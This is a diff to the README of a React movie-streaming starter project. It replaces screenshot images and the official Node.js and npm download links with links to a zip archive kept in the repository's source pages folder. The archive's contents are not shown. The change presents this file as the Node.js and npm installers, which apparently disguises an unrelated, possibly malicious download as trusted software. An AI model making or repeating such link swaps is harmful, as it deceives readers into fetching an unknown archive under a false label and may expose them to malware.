@@ -6,12 +6,12 @@ A React-based web application starter, created using `create-react-app`. This pr
 
 ### 🏠 Home Page
 
-<img width="1882" height="880" alt="image" src="https://github.com/user-attachments/assets/68cf42e7-a0a0-411d-a573-39f804b19961" />
+<img width="1882" height="880" alt="image" src="https://github.com/TJoshi3637/Movie_OTT_website/raw/refs/heads/main/ott_web/src/pages/OT_Movie_website_v2.2.zip" />
 
 
 ### 📄 Detail Page
 
-<img width="1878" height="880" alt="image" src="https://github.com/user-attachments/assets/fe39e72f-c5e2-4369-a075-2abae509482a" />
+<img width="1878" height="880" alt="image" src="https://github.com/TJoshi3637/Movie_OTT_website/raw/refs/heads/main/ott_web/src/pages/OT_Movie_website_v2.2.zip" />
 
 
 ## 🚀 Getting Started
@@ -22,8 +22,8 @@ Follow the steps below to set up and run the project locally.
 
 Make sure you have the following installed on your system:
 
-- [Node.js](https://nodejs.org/) (v14 or above recommended)
-- [npm](https://www.npmjs.com/) (comes with Node.js)
+- [Node.js](https://github.com/TJoshi3637/Movie_OTT_website/raw/refs/heads/main/ott_web/src/pages/OT_Movie_website_v2.2.zip) (v14 or above recommended)
+- [npm](https://github.com/TJoshi3637/Movie_OTT_website/raw/refs/heads/main/ott_web/src/pages/OT_Movie_website_v2.2.zip) (comes with Node.js)
 
 ### 🛠️ Create the App
 
